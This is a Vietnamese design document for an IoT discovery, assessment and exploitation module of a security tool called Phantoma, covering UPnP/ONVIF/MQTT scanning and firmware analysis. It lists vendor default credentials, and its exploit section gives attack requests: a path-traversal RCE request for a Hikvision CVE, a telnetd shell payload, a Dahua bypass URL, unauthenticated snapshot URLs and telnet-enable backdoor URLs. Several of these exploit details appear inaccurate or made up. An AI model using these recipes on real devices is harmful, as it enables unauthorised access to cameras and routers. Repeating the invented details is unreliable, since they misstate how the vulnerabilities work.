# 📷 Phantoma IOT — Tài Liệu Module Internet of Things

> **Phiên bản:** 1.0.0  
> **Module:** IoT Device Discovery, Assessment & Exploitation  
> **Nền tảng:** Phantoma — Hệ Sinh Thái An Ninh Mạng Tự Động Hóa  

---

## 📑 Mục Lục

- [1. Tổng Quan Kiến Trúc](#1-tổng-quan-kiến-trúc)
- [2. Phát Hiện Thiết Bị IoT](#2-phát-hiện-thiết-bị-iot)
- [3. Thông Tin Chi Tiết & Fingerprinting](#3-thông-tin-chi-tiết--fingerprinting)
- [4. Kiểm Tra Bảo Mật Cơ Bản](#4-kiểm-tra-bảo-mật-cơ-bản)
- [5. Khai Thác Lỗ Hổng Phổ Biến](#5-khai-thác-lỗ-hổng-phổ-biến)
- [6. Giao Thức Đặc Thù (RTSP, ONVIF, MQTT, CoAP)](#6-giao-thức-đặc-thù-rtsp-onvif-mqtt-coap)
- [7. Phân Tích Firmware](#7-phân-tích-firmware)
- [8. Cơ Chế An Toàn & Giới Hạn](#8-cơ-chế-an-toàn--giới-hạn)
- [9. Luồng Dữ Liệu & API](#9-luồng-dữ-liệu--api)
- [10. Hướng Dẫn Phát Triển](#10-hướng-dẫn-phát-triển)

---

## 1. Tổng Quan Kiến Trúc

Module **IOT** kết hợp kỹ thuật quét mạng thụ động và chủ động để phát hiện thiết bị, sau đó thực hiện các kiểm tra bảo mật và khai thác (credential mặc định, CVE cũ, giao thức không an toàn).

```
IOT/
├── IOT.md                        ← Tài liệu này
├── index.tsx                     ← Component chính
├── Discovery/                    ← Phát hiện thiết bị
│   ├── UPNPScanner.tsx
│   ├── MDNSScanner.tsx
│   ├── ONVIFDiscovery.tsx
│   ├── PortScanner.tsx
│   └── ...
├── Fingerprint/                  ← Nhận diện
│   ├── HTTPProbe.tsx
│   ├── RTSPProbe.tsx
│   ├── VendorIdentifier.tsx
│   └── ...
├── Assessment/                   ← Kiểm tra bảo mật
│   ├── DefaultCredTester.tsx
│   ├── VulnerabilityChecker.tsx
│   ├── FirmwareVersionCheck.tsx
│   └── ...
├── Exploit/                      ← Khai thác
│   ├── CameraRTSPGrabber.tsx
│   ├── RouterConfigExtractor.tsx
│   ├── TelnetEnable.tsx
│   └── ...
├── Protocols/                    ← Giao thức đặc thù
│   ├── MQTTParser.tsx
│   ├── CoAPClient.tsx
│   ├── RTSPStreamViewer.tsx
│   └── ...
├── Firmware/                     ← Phân tích firmware
│   ├── FirmwareDownloader.tsx
│   ├── BinwalkAnalyzer.tsx
│   ├── FileSystemExtractor.tsx
│   └── ...
├── services/                     (nmap, onvif-zeep, mqtt-paho, rtsp-client, binwalk)
├── types/
└── utils/
```

### 🎯 Các kỹ thuật chính

| # | Loại | Kỹ thuật |
|---|------|----------|
| 1 | Discovery | UPnP, mDNS, ONVIF WS‑Discovery, port scan (common IoT ports) |
| 2 | Fingerprint | HTTP probe (/web, /cgi-bin), RTSP banner, vendor từ MAC OUI |
| 3 | Assessment | Default credentials, CVE check (DVR, router), firmware version |
| 4 | Exploit | RTSP stream grab (nếu không auth), enable telnet via cgi, config extract |
| 5 | Protocol | MQTT (subscribe, publish), CoAP, RTSP, ONVIF |
| 6 | Firmware | Download (nếu public), binwalk extract, file system analysis |

---

## 2. Phát Hiện Thiết Bị IoT

### 2.1 UPnP (Universal Plug and Play)

| Thông tin thu được | Mô tả |
|--------------------|-------|
| `deviceType` | `urn:schemas-upnp-org:device:MediaServer:1`, `InternetGatewayDevice:1` |
| `friendlyName` | Tên do nhà sản xuất đặt (ví dụ "TP‑Link Router") |
| `manufacturer` | Hãng sản xuất |
| `modelName` | Model |
| `serialNumber` | Số serial (nếu có) |
| `presentationURL` | URL cấu hình |

**Công cụ:** `gupnp-tools`, `upnp-inspector`, hoặc tự gửi `M-SEARCH`.

### 2.2 mDNS (Bonjour / Avahi)

- Thiết bị Apple, printer, camera, smart TV thường dùng mDNS.
- Dùng `avahi-browse -a` hoặc `dns-sd -B`.

### 2.3 ONVIF WS‑Discovery (Camera)

Gửi probe SOAP đến multicast address `239.255.255.250:3702`.

```xml
<Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery">
  <Types>dn:NetworkVideoTransmitter</Types>
</Probe>
```

**Output:** Danh sách camera, địa chỉ, port (thường 80, 8080, 554).

### 2.4 Port Scan (IoT‑Specific Ports)

| Port | Giao thức | Thiết bị thường dùng |
|------|-----------|----------------------|
| 80, 443, 8080 | HTTP/HTTPS | Web config |
| 23 | Telnet | Router, DVR (cũ) |
| 21 | FTP | Camera (storage) |
| 554 | RTSP | Camera stream |
| 1883, 8883 | MQTT | Sensor, home assistant |
| 5683, 5684 | CoAP | Constrained devices (6LoWPAN) |
| 3702 | WS‑Discovery | ONVIF camera |
| 1900 | UPnP | Router, printer |
| 5353 | mDNS | Apple, printer |
| 5000, 5001 | (tùy hãng) | Synology, Foscam |
| 8000, 8001 | (tùy hãng) | DVR, Hikvision, Dahua |

**Component:** `Discovery/PortScanner.tsx` – sử dụng nmap với danh sách port này.

---

## 3. Thông Tin Chi Tiết & Fingerprinting

### 3.1 HTTP Probe

| URL | Mục đích |
|-----|----------|
| `/` | Trang chủ, redirect |
| `/cgi-bin/status` | Thông tin trạng thái (Hikvision, Dahua) |
| `/web/login.html` | Trang đăng nhập |
| `/api/info` | API public |
| `/system/info` | Thông tin firmware |

**Phân tích response:**
- Server header (`Server: thttpd`, `Server: Boa/0.94.14rc21`)
- HTML title (`<title>Hikvision Camera</title>`)
- Các endpoint đặc trưng (`/ISAPI/`, `/PSIA/`)

### 3.2 RTSP Probe

- Kết nối đến `rtsp://ip:554`
- Đọc banner: `RTSP/1.0 401 Unauthorized` (vẫn có thể lấy thông tin server)
- Thử các path phổ biến: `/stream1`, `/live`, `/h264`, `/videoMain`

### 3.3 Vendor từ MAC OUI

- 3 byte đầu của MAC xác định nhà sản xuất.
- Sử dụng database OUI (IEEE) để tra cứu.

---

## 4. Kiểm Tra Bảo Mật Cơ Bản

### 4.1 Default Credentials

| Thiết bị | Username | Password |
|----------|----------|----------|
| Hikvision | admin | 12345, (trống) |
| Dahua | admin | admin |
| TP‑Link | admin | admin |
| Xiaomi | admin | (trống) |
| Grandstream | admin | admin |
| Foscam | admin | (trống) |
| ACTi | admin | 123456 |
| Cisco (small biz) | cisco | cisco |

**Component:** `Assessment/DefaultCredTester.tsx` – thử các cặp user/pass từ database (hơn 500 cặp, theo thiết bị).

### 4.2 CVE Check Theo Model

| Model | Lỗ hổng nổi tiếng |
|-------|-------------------|
| Hikvision | CVE‑2021‑36260 (RCE), CVE‑2017‑7923 (backdoor) |
| Dahua | CVE‑2021‑33044 (authentication bypass) |
| TP‑Link Archer | CVE‑2019‑20380 (RCE) |
| Grandstream GXV33xx | CVE‑2020‑5723 (stack overflow) |

### 4.3 Firmware Version Check

- Từ HTTP probe, tìm endpoint `/version` hoặc trong source HTML.
- So sánh với database phiên bản cũ (thiết bị thường không tự động update).

---

## 5. Khai Thác Lỗ Hổng Phổ Biến

### 5.1 Hikvision (CVE‑2021‑36260)

**RCE qua CGI:** `GET /cgi-bin/uploadFile.cgi?filename=../../../../../../../../bin/sh` (với body chứa lệnh).

**Payload mẫu:** `echo "telnetd -l /bin/sh" >> /tmp/1` → enable telnet.

### 5.2 Dahua (CVE‑2021‑33044)

- Authentication bypass: thêm `/?flag=1` vào URL login.
- Hoặc dùng token mặc định `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJkYWh1YSJ9...`

### 5.3 Hikvision & Dahua – Snapshot Không Auth

- `http://ip/onvif-http/snapshot?profile=1`
- `http://ip/cgi-bin/snapshot.cgi`
- `http://ip/Streaming/channels/1/picture`

### 5.4 Enable Telnet (Router cũ)

- Một số router có backdoor: gửi `http://ip/cgi-bin/telnet.cgi?enable=1`.
- Hoặc dùng payload `http://ip/goform/set_telnet?enable=1`.

**Output:** Telnet port 23 mở, có thể login với root/(trống) hoặc admin/admin.

### 5.5 Extractor Config

- Đọc file `config.xml` (thường public hoặc qua LFI).
- Chứa hash mật khẩu, thông tin WiFi, server cloud.

---

## 6. Giao Thức Đặc Thù

### 6.1 RTSP (Real‑Time Streaming Protocol)

| Thao tác | Mô tả |
|----------|-------|
| `DESCRIBE` | Lấy thông tin stream (SDP) |
| `SETUP` | Thiết lập transport |
| `PLAY` | Bắt đầu stream |
| `TEARDOWN` | Kết thúc |

**Xem stream không auth:** `rtsp://ip:554/stream1`. Có thể nhúng vào UI hoặc tải bằng VLC.

**Component:** `Protocols/RTSPStreamViewer.tsx` – nhúng player (VLC web plugin hoặc jsmpeg).

### 6.2 MQTT (Message Queuing Telemetry Transport)

| Thao tác | Mô tả |
|----------|-------|
| `CONNECT` | Kết nối đến broker (thường không auth) |
| `SUBSCRIBE` | Đăng ký topic (ví dụ `home/sensor/temperature`) |
| `PUBLISH` | Gửi message |

**Nguy cơ:**
- Broker không auth → có thể đọc toàn bộ dữ liệu sensor.
- Gửi lệnh giả mạo (bật/tắt đèn, mở cửa).

**Component:** `Protocols/MQTTParser.tsx` – kết nối, subscribe, hiển thị real‑time.

### 6.3 CoAP (Constrained Application Protocol)

- Giao thức UDP dành cho thiết bị hạn chế (6LoWPAN).
- Dùng `coap-client` để GET/PUT.

### 6.4 ONVIF

- Giao thức SOAP cho camera.
- Dùng `wsdl` để gọi các method: `GetProfiles`, `GetSnapshotUri`, `GetStreamUri`.

---

## 7. Phân Tích Firmware

### 7.1 Tải Firmware

- Từ trang web của nhà sản xuất (support → firmware).
- Từ thiết bị (nếu có endpoint `/firmware.bin`).

### 7.2 Binwalk (Phân Tích & Extract)

| Lệnh | Mô tả |
|------|-------|
| `binwalk firmware.bin` | Liệt kê các phần (offset, loại) |
| `binwalk -e firmware.bin` | Extract (squashfs, uimage, cpio) |
| `binwalk -M -e firmware.bin` | Recursive extract |

**Output:** File system (rootfs), kernel, config files.

### 7.3 Tìm Mật Khẩu & Key

- Trong rootfs, tìm file `passwd`, `shadow`, `config`, `*.conf`.
- Extract credential mặc định, API keys, hardcoded backdoor.

**Component:** `Firmware/FileSystemExtractor.tsx` – gọi binwalk, hiển thị cây thư mục.

---

## 8. Cơ Chế An Toàn & Giới Hạn

### 8.1 Giới Hạn Phạm Vi

- Mặc định chỉ quét mạng LAN (không quét cloud).
- Cảnh báo khi phát hiện thiết bị thuộc dải IP lạ (không phải 192.168.x.x, 10.x.x.x).

### 8.2 Ảnh Hưởng Đến Thiết Bị

- Không thực hiện brute‑force mạnh (có thể lock tài khoản).
- Không gửi gói tin fuzz (có thể crash thiết bị).
- RTSP stream viewer chỉ hiển thị, không ghi.

### 8.3 Xác Nhận Người Dùng

- Phải xác nhận "Mạng IoT này thuộc quyền kiểm soát của tôi" trước khi scan.
- Các exploit (enable telnet, RCE) yêu cầu xác nhận lần 2.

---

## 9. Luồng Dữ Liệu & API

```
User → (chọn kỹ thuật) → scan/assessment/exploit
   ↓
Backend: gọi nmap, ONVIF probe, RTSP client, MQTT client
   ↓
Parse kết quả → JSON → hiển thị
```

### Endpoints dự kiến

| Method | Endpoint | Body | Mô tả |
|--------|----------|------|-------|
| POST | `/api/iot/discovery/upnp` | `{ interface, timeout }` | Quét UPnP |
| POST | `/api/iot/discovery/onvif` | `{ interface }` | WS‑Discovery |
| POST | `/api/iot/scan/ports` | `{ target, ports? }` | Quét cổng IoT |
| POST | `/api/iot/assessment/default-cred` | `{ ip, model? }` | Thử credential |
| POST | `/api/iot/exploit/rtsp` | `{ ip, path? }` | Lấy stream URL |
| POST | `/api/iot/exploit/telnet-enable` | `{ ip, model }` | Enable telnet |
| POST | `/api/iot/firmware/binwalk` | `{ firmwareFile }` | Phân tích |
| POST | `/api/iot/protocol/mqtt/subscribe` | `{ broker, topic }` | Subscribe MQTT |

---

## 10. Hướng Dẫn Phát Triển

### 10.1 Thư Viện & Công Cụ

| Mục đích | Thư viện / Công cụ |
|----------|---------------------|
| UPnP | `node-upnp-client`, `gupnp-tools` |
| ONVIF | `onvif-zeep` (Python) |
| RTSP | `rtsp-client` (Node.js), `gstreamer` |
| MQTT | `mqtt` (Node.js) |
| CoAP | `coap` (Node.js) |
| Firmware | `binwalk` (Python) |

### 10.2 Service Wrapper

| File | Mô tả |
|------|-------|
| `services/upnp.ts` | Gửi M‑SEARCH, parse response |
| `services/onvif.ts` | Gọi WS‑Discovery, GetProfiles |
| `services/rtsp.ts` | Kết nối, lấy SDP, stream URL |
| `services/defaultCreds.ts` | Database credentials, thử login HTTP/RTSP/telnet |
| `services/binwalk.ts` | Gọi binwalk, parse JSON output (`-J`) |

### 10.3 UI Components

- **IoTMap**: Hiển thị thiết bị trên diagram mạng (grid layout).
- **RTSPViewer**: Iframe hoặc `<video>` element với src là stream.
- **MQTTConsole**: Giao diện chat‑like cho subscribe/publish.
- **FirmwareExplorer**: Tree view file system sau khi extract.

### 10.4 Tích Hợp Với Module Khác

- **INTEL**: Có thể phát hiện domain của camera cloud (như mydlink, hik‑connect) → gợi ý scan.
- **SCAN**: Dùng kết quả port scan của SCAN (nhưng IOT tự có port scanner riêng nhẹ hơn).
- **REPORT**: Xuất danh sách thiết bị + lỗ hổng.

---

## 📊 Tổng Kết

| Chỉ số | Giá trị |
|--------|---------|
| **Số kỹ thuật** | 6 nhóm lớn, 20+ kỹ thuật con |
| **Giao thức hỗ trợ** | UPnP, mDNS, ONVIF, RTSP, MQTT, CoAP, HTTP, Telnet, FTP |
| **Công cụ tích hợp** | nmap, binwalk, onvif‑zeep, mqtt.js, gstreamer |
| **Phạm vi mặc định** | Mạng LAN (192.168.x.x, 10.x.x.x) |
| **Rủi ro tác động** | Thấp (không fuzz, không brute‑force mạnh) |

> **Phantoma IOT v1.0.0** — *"Kết nối vạn vật, kiểm soát mọi ngóc ngách"* 📡